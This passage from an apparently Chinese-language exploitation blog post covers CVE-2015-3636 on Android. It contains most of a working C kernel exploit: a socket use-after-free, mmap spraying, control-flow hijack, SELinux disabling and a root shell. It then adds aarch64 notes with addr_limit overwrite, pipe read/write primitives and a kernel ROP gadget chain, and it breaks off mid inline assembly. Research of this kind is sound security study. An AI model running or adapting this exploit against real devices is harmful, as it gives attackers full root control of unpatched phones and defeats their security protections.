close(pipe_fd1[<span class="number">0</span>]);</span><br><span class="line">            close(pipe_fd2[<span class="number">1</span>]);</span><br><span class="line">            do_child_task(pipe_fd2[<span class="number">0</span>],pipe_fd1[<span class="number">1</span>],i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(pipe_fd1[<span class="number">1</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">0</span>]);</span><br><span class="line">        read_fd = pipe_fd1[<span class="number">0</span>];</span><br><span class="line">        write_fd = pipe_fd2[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// communicate with child process, (1000 child sock + 1 parent sock)</span></span><br><span class="line">        <span class="keyword">int</span> child_result;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">10</span>; j++)&#123;</span><br><span class="line">            read(read_fd, &amp;child_result, <span class="keyword">sizeof</span>(child_result));       <span class="comment">// get child status</span></span><br><span class="line">            <span class="keyword">if</span>(child_result == <span class="number">1</span>)&#123;</span><br><span class="line">                vuln_sock[vuln_sock_count] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">                ret = connect(vuln_sock[vuln_sock_count], (<span class="keyword">const</span> struct sockaddr *) &amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">                <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;parent connect failed!\\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;index: %d\\n&quot;</span>,i);</span><br><span class="line">                &#125; </span><br><span class="line">                vuln_sock_count++;</span><br><span class="line">                child_result = <span class="number">2</span>;</span><br><span class="line">                write(write_fd,&amp;child_result,<span class="keyword">sizeof</span>(child_result));   <span class="comment">// send parent status to child</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(child_result == <span class="number">3</span>)&#123;  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    [round %d] created %d vunl sock now\\n&quot;</span>, i, vuln_sock_count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] malloc socks done\\n&quot;</span>);</span><br><span class="line"><span class="comment">// kill all the child process</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAX_CHILD_NUM;i++)&#123;</span><br><span class="line">        kill(child_pid[i],SIGKILL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger uaf</span></span><br><span class="line">    sleep(<span class="number">3</span>);       <span class="comment">// will affect trigger uaf</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] trigger uaf\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;vuln_sock_count; i++)&#123;</span><br><span class="line">        ret = connect(vuln_sock[i], (<span class="keyword">const</span> struct sockaddr *) &amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;connect failed!\\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;index: %d\\n&quot;</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">        ret = connect(vuln_sock[i], (<span class="keyword">const</span> struct sockaddr *) &amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;connect failed!\\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;index: %d\\n&quot;</span>,i);</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sk_stamp</span><span class="params">(<span class="keyword">int</span> sock)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">tv</span>;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> value;</span><br><span class="line">    <span class="keyword">unsigned</span> high, low;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(sock, SIOCGSTAMPNS, &amp;tv);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    value = ((<span class="keyword">long</span> <span class="keyword">long</span>)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;</span><br><span class="line">    high = (<span class="keyword">unsigned</span>)(value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    low = (<span class="keyword">unsigned</span>)value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (high == TIMESTAMP_MAGIC) &#123;</span><br><span class="line">        vuln_sock_addr = low - SK_STAMP_OFFSET;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_target_sock</span><span class="params">(<span class="keyword">int</span> *socks)</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span>* mapped[MAX_MMAP_NUM];</span><br><span class="line">    <span class="keyword">unsigned</span>* mapped_page;</span><br><span class="line">    <span class="keyword">int</span> i,j, k, ret;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> test_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mmap_count = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> reserve_size = MEM_RESERVE_SIZE;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> loop_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    loop_count++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_MMAP_NUM; i++)&#123;</span><br><span class="line">        ret = sysinfo(&amp;info);</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (info.freeram &lt; reserve_size) &#123;</span><br><span class="line">                <span class="keyword">if</span> (loop_count &lt; <span class="number">4</span>) &#123;</span><br><span class="line">                    reserve_size = info.freeram;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if(ret == 0)&#123;</span></span><br><span class="line">        <span class="comment">//     if(info.freeram &lt; MEM_RESERVE_SIZE)&#123;</span></span><br><span class="line">        <span class="comment">//         break;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        mapped[i] = mmap(<span class="literal">NULL</span>, ONE_MMAP_SIZE , PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mapped[i] == MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap failed\\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mmap_count++;</span><br><span class="line"></span><br><span class="line">        mapped_page = mapped[i];</span><br><span class="line">        ret = mlock(mapped[i], ONE_MMAP_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// printf(&quot;mlock error\\n&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; ONE_MMAP_SIZE; j += <span class="keyword">sizeof</span>(*mapped_page)*<span class="number">2</span>)&#123;</span><br><span class="line">            *mapped_page++ = (<span class="keyword">unsigned</span>)mapped_page;</span><br><span class="line">            *mapped_page++ = TIMESTAMP_MAGIC;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; vuln_sock_count; k++)&#123;</span><br><span class="line">            ret = get_sk_stamp(socks[k]);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; [-] success! find one vuln sock, index is %d\\n&quot;</span>, k);</span><br><span class="line">                vuln_sock_index = k;</span><br><span class="line">                mapped[i] = <span class="number">0</span>;      <span class="comment">// avoid unmap</span></span><br><span class="line">                test_count++;</span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(test_count &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] going to unmap!\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;mmap_count; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mapped[i])&#123;</span><br><span class="line">            munmap(mapped[i], ONE_MMAP_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] unmap finished.\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> test_count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] now, the uid is :%d\\n&quot;</span>,ret);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [-] here is a root shell, enjoy it!\\n&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get root shell\\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span>*(*pkc)(<span class="keyword">int</span>) = <span class="number">0xC0039C30</span>;</span><br><span class="line">    <span class="keyword">int</span>(*cc)(<span class="keyword">unsigned</span>*) = <span class="number">0xC00396FC</span>;</span><br><span class="line">    <span class="keyword">unsigned</span>* selinux_enforcing_addr = <span class="number">0xc04ec378</span>;</span><br><span class="line">    </span><br><span class="line">    *selinux_enforcing_addr = <span class="number">0</span>;        <span class="comment">// setenforce 0</span></span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));                   <span class="comment">// setuid 0, etc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// unsigned ret_fast_syscall_func = 0xC000D7C0;</span></span><br><span class="line">    <span class="comment">// asm</span></span><br><span class="line">    <span class="comment">// (</span></span><br><span class="line">    <span class="comment">//     &quot;LDR     R3, =0xC0039C30 \\n\\t&quot;   </span></span><br><span class="line">    <span class="comment">//     &quot;MOV     R0, #0 \\n\\t&quot;</span></span><br><span class="line">    <span class="comment">//     &quot;BLX     R3 \\n\\t&quot;</span></span><br><span class="line">    <span class="comment">//     &quot;LDR     R3, =0xC00396FC \\n\\t&quot;  </span></span><br><span class="line">    <span class="comment">//     &quot;BLX     R3 \\n\\t&quot;</span></span><br><span class="line">    <span class="comment">//     &quot;LDR     R3, =0xC000D7C0 \\n\\t&quot; </span></span><br><span class="line">    <span class="comment">//     &quot;BLX     R3 \\n\\t&quot;</span></span><br><span class="line">    <span class="comment">// );</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] vuln_sock_addr: 0x%x \\n [-] vuln_sock_index: %d \\n&quot;</span>,vuln_sock_addr,vuln_sock_index);</span><br><span class="line">    <span class="keyword">unsigned</span> func_addr = get_root;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] get_root: 0x%lx\\n&quot;</span>,get_root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] func_addr: 0x%lx\\n&quot;</span>,func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] &amp;func_addr: 0x%lx\\n&quot;</span>,&amp;func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] get_shell: 0x%lx\\n&quot;</span>,get_shell); </span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span>*)(vuln_sock_addr+<span class="number">0x1c</span>) = &amp;func_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span>*)(vuln_sock_addr+<span class="number">0x194</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] set sock done!\\n&quot;</span>);</span><br><span class="line">    <span class="comment">// sleep(10);</span></span><br><span class="line">    close(vuln_sock[vuln_sock_index]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] returned from kernel, let&#x27;s get a shell.\\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,ret;</span><br><span class="line"></span><br><span class="line">    vuln_sock_count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vuln_sock, <span class="number">0x0</span>, MAX_VUL_SOCKS_NUM);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa1, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    sa1.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa2, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    sa2.sin_family = AF_UNSPEC;</span><br><span class="line"></span><br><span class="line">    ret = maximize_fd_limit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] set rlimit. rlim.rlim_cur: %d\\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">    mmap_200200();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. create vuln socks</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 1: create vulnerable socks\\n&quot;</span>);</span><br><span class="line">    create_vuln_socks();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 1 finished\\n&quot;</span>);</span><br><span class="line"><span class="comment">// 2. mmap spray</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 2: mmap spray to find target vuln sock\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> _=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [-] try find_target_sock: %d\\n&quot;</span>, _++);</span><br><span class="line">        ret = find_target_sock(vuln_sock);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; [-] Done!\\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 2 finished\\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 3. hijack control flow, and get root</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 3: hijack kernel control flow and get root shell\\n&quot;</span>);</span><br><span class="line">    do_get_root();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]should never be there\\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

        <h2 id="一些注意点"   >
          <a href="#一些注意点" class="heading-link"><i class="fas fa-link"></i></a><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h2>
      <p>本题利用心得：在未开启PAN和PXN的系统上，如果控制流劫持成功了，且劫持点是一个函数指针。那么，最简单的办法就是执行一个用户态函数（提权，改selinux等），该函数执行完毕后，内核会正常返回用户态。再在用户态中执行一下get shell函数即可。</p>
<p>其他：</p>
<ul>
<li><p>需要使用父子进程通信时，一定要注意，尽量什么值都别传，不然一个不小心就容易出错。父子进程最常用的通信方式有pipe系统调用，或者通过ptrace来控制子进程的执行和停止。</p>
</li>
<li><p>mmap spray时，最好结合sysinfo的信息，决定何时停止mmap，防止因内存不足崩溃</p>
</li>
<li><p>mmap映射某些重要内存（后续会访问）时，最好用mlock锁定一下，防止被换出。参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a4e653db1b2" >用mlock防止内存被换出到swap空间</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>

        <h1 id="android-7-1-环境下3636的利用"   >
          <a href="#android-7-1-环境下3636的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-7-1-环境下3636的利用" class="headerlink" title="android 7.1 环境下3636的利用"></a>android 7.1 环境下3636的利用</h1>
      
        <h2 id="基本信息-1"   >
          <a href="#基本信息-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2>
      <p>架构：aarch64</p>
<p>linux版本：3.10.0+</p>
<p>防护措施：开启PXN，selinux；未开启PAN，KASLR</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generic_arm64:/ <span class="comment"># cat /proc/version</span></span><br><span class="line">Linux version 3.10.0+ (root@762e8f0b371a) (gcc version 4.9.x 20150123 (prerelease) (GCC) ) <span class="comment">#5 SMP PREEMPT Fri Apr 14 12:03:15 CST 2023</span></span><br></pre></td></tr></table></div></figure>

        <h2 id="漏洞分析-1"   >
          <a href="#漏洞分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>
      <p>参考<a href="https://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">之前的文章</a></p>

        <h2 id="漏洞利用-1"   >
          <a href="#漏洞利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>
      <p>有几个点需要注意一下的</p>

        <h3 id="控制流劫持-physmap-spray-1"   >
          <a href="#控制流劫持-physmap-spray-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持-physmap-spray-1" class="headerlink" title="控制流劫持 - physmap spray"></a>控制流劫持 - physmap spray</h3>
      <p>aarch64上的physmap spray比 arm32的要简单些，直接用第一种方法就可以</p>
<ol>
<li><p>第一次尝试（成功）</p>
<ul>
<li><p>喷4096个 UAF sock</p>
</li>
<li><p>mmap最大的空间并填充，最后搜索哪个sock被覆盖到</p>
<p>这里，mmap spray的内存要多点，一开始我只给了 <code>300*2*1024*1024</code> ，后来给到<code>5*128*1024*1024</code> 就可以了。（768M/1G）</p>
<p>另外，一次mmap的size尽量给大点，可以减少系统调用时间的消耗</p>
<p>关于MAX_MMAP_NUM和ONE_MMAP_SIZE，<code>6*(128*1024*1024)</code>和<code>384*(2*1024*1024)</code>都可以。</p>
</li>
</ul>
</li>
</ol>

        <h3 id="get-root-shell-pipe-r-w"   >
          <a href="#get-root-shell-pipe-r-w" class="heading-link"><i class="fas fa-link"></i></a><a href="#get-root-shell-pipe-r-w" class="headerlink" title="get root shell - pipe r/w"></a>get root shell - pipe r/w</h3>
      <blockquote>
<p>这是作者的方法，更简洁通用</p>
</blockquote>
<p>1、改addr_limit</p>
<p>利用 <code>kernel_setsockopt()</code> 函数，将进程的 <code>addr_limit</code> 设置成 0xffffffffffffffff，于是用户态可以访问内核空间。（恰好控制流劫持时X1为0，不为1，才可以跳过将addr_limit设置回TASK_SIZE那一步）</p>
<p>改完进程的 <code>addr_limit</code> 后，就可以利用 <code>pipe</code> 系统调用来构造内核任意地址读写原语了！</p>
<p>2、泄露thread_info</p>
<p>方法1：利用 <code>mutex_trylock()</code> 函数的如下代码片段，泄露进程的thread_info结构体地址，计算cred地址。（恰好X1是0，会将task地址写到0x18地址处，在用户态mmap一下低地址，即可读取该值）</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.kernel:FFFFFFC000530A58                 MOV             X2, SP</span><br><span class="line">.kernel:FFFFFFC000530A5C                 AND             X2, X2, #0xFFFFFFFFFFFFC000</span><br><span class="line">.kernel:FFFFFFC000530A60                 LDR             X2, [X2,#0x10]</span><br><span class="line">.kernel:FFFFFFC000530A64                 STR             X2, [X1,#0x18]</span><br><span class="line">.kernel:FFFFFFC000530A68                 RET</span><br></pre></td></tr></table></div></figure>
<ul>
<li>找其他gadget的方式：正则表达式<code>sp .* #0xFFFFFFFFFFFFC000 .* str</code></li>
</ul>
<p>方法2： 通过 <strong>JOP</strong> 的方式将内核栈 sp 地址泄露到用户空间，然后在用户态完成计算，写cred。（相当于通过 JOP 链执行了一个函数，又返回到控制流劫持的下一条指令处。相比与kernel rop的好处是，不用恢复栈地址。）</p>
<p>3、改selinux，改cred结构体，用户态get root shell</p>

        <h3 id="get-root-shell-kernel-rop"   >
          <a href="#get-root-shell-kernel-rop" class="heading-link"><i class="fas fa-link"></i></a><a href="#get-root-shell-kernel-rop" class="headerlink" title="get root shell - kernel rop"></a>get root shell - kernel rop</h3>
      <blockquote>
<p>上面两位作者的方法，都需要找两次vuln sock，我希望只找一次sock就能成，于是我试了另一种比较笨的方法 - Kernel ROP，看能不能成。没想到，竟然真的找到一条可用的ROP链！！</p>
</blockquote>
<p>rop的思路是，尽可能利用系统调用时，放入内核栈中的用户态寄存器。于是需要自己写一段内联汇编，实现对 <code>close()</code> 函数的调用。需要注意参数的传递，因为对arm内联汇编不熟，这里走了些弯路。</p>
<p>虽然有将近30个寄存器的内容可控，但是由于aarch64 ROP的特殊性，这点空间根本不够用。于是在内核完成提权和关selinux后，又回到用户态设置栈平衡。</p>
<ul>
<li><p>第一段rop - in kernel</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">b *<span class="number">0xffffffc000083e40</span>        el0_sync</span><br><span class="line">b *<span class="number">0xffffffc0000842c8</span>         fast_exit</span><br><span class="line">b *<span class="number">0xFFFFFFC00042E39C</span>       inet_release</span><br><span class="line"></span><br><span class="line">hijack pc -&gt; <span class="number">0xffffffc000118458</span> : add sp, sp, #<span class="number">0x100</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0004f8198</span> : add sp, sp, #<span class="number">0x110</span> ; ret</span><br><span class="line"><span class="number">0xffffffc0003b0e10</span> : add sp, sp, #<span class="number">0x150</span> ; ret</span><br><span class="line"></span><br><span class="line">x2,x3 -&gt; x19,x20</span><br><span class="line"></span><br><span class="line">prepare_kernel_cred中，从<span class="number">0xffffffc0000c00c0</span>出</span><br><span class="line">commit_creds中，从<span class="number">0xffffffc0000bfbbc</span>出</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0002b5f70</span> : ldr x21, [sp, #<span class="number">0x10</span>] ; add sp, sp, #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0xffffffc0002cb748</span> : ldr x22, [x1, #<span class="number">0x18</span>] ; blr x2            <span class="comment">// 如果x22默认是0的话，可以不设置</span></span><br><span class="line"><span class="number">0xffffffc0002682ec</span> : mov x22, #<span class="number">0</span> ; blr x2</span><br><span class="line"><span class="number">0xffffffc0000824d8</span> : ldr x23, [sp, #<span class="number">0x30</span>] ; ldp x29, x30, [sp], #<span class="number">0x40</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0000813f4</span> : ldp x21, x22, [sp, #<span class="number">0x20</span>] ; ldp x29, x30, [sp], #<span class="number">0x30</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc00017eb08</span> : ldr x0, [x19, #<span class="number">0x30</span>] ; ldr x19, [sp, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改selinux</span></span><br><span class="line"><span class="number">0xffffffc00025bc94</span> : str w19, [x20] ; ldp x19, x20, [sp, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备改系统寄存器</span></span><br><span class="line"><span class="number">0xffffffc0000876a0</span> : ldp x21, x22, [sp, #<span class="number">0x20</span>] ; ldp x23, x24, [sp, #<span class="number">0x30</span>] ; ldp x29, x30, [sp], #<span class="number">0x40</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 ret_fast_syscall()-&gt; fast_exit() 中的代码，正常返回用户态</span></span><br><span class="line"><span class="number">0xFFFFFFC000084290</span> : </span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* selinux_enforcing = <span class="number">0xFFFFFFC0006EB94C</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* pkc_addr = <span class="number">0xFFFFFFC0000C0014</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* cc_addr = <span class="number">0xFFFFFFC0000BFAB4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;LDR     X0, =0x3 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     X1, =0xFFFFFFC0000C0014 \\n\\t&quot;</span>        <span class="comment">// 0xFFFFFFC0000C0014 prepare_kernel_cred    </span></span><br><span class="line">    <span class="string">&quot;LDR     X2, =0x0 \\n\\t&quot;</span>               <span class="comment">// to x19    </span></span><br><span class="line">    <span class="string">&quot;LDR     X3, =selinux_enforcing \\n\\t&quot;</span>                <span class="comment">// to x20    </span></span><br><span class="line">    <span class="string">&quot;LDR     X4, =0x04040404 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     